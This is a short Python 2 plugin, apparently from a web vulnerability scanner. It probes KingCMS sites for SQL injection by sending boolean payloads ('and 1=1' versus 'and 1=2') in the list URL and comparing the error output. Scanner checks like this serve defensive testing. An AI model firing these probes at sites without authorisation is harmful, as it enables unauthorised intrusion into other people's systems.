#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl1= "%s%s"%(url,"index.php/list-1%20and%201=1.html")
        expurl2="%s%s"%(url,"index.php/list-1%20and%201=2.html")
        #print expurl1
        res, content = requestUrl(http,expurl1,ob['task_id'],ob['domain_id'])
        r, c = requestUrl(http,expurl2,ob['task_id'],ob['domain_id'])
        if content.find('File:core.class.php')<0 and c.find("File:core.class.php")>=0:
            request = getRequest(expurl1)
            response = getResponse(res)
            list.append(getRecord(ob,expurl1,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:kingcmslistsqlinject.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:kingcmslistsqlinject.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def